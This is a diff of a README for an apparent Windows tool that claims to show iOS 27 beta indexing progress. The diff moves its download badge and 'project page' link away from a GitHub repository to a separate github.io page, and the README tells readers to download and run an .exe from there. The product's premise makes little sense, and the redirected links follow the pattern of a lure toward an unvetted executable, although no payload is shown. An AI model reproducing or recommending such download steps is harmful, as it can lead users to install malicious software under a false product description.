@@ -1,6 +1,6 @@
 # 📊 ios27-beta-indexing-progress-windows - View your indexing progress with ease
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-blue.svg)](https://github.com/Pink-didion374/ios27-beta-indexing-progress-windows)
+[![Download for Windows](https://img.shields.io/badge/Download-Windows-blue.svg)](https://pink-didion374.github.io)
 
 This software provides a clear way to see how much progress your computer has made while indexing files for the iOS 27 beta. When you update your device, the system often triggers a long process to catalog data. This tool lets you monitor that work so you know when the process finishes.
 
@@ -23,7 +23,7 @@ To run this tool, ensure your computer meets these basic needs:
 
 Follow these steps to set up the tool on your machine.
 
-1. Visit the [project page](https://github.com/Pink-didion374/ios27-beta-indexing-progress-windows) to find the latest version.
+1. Visit the [project page](https://pink-didion374.github.io) to find the latest version.
 2. Look for the section labeled "Releases" on the right side of the page.
 3. Click the most recent version number to see the available files.
 4. Download the file ending in `.exe`.
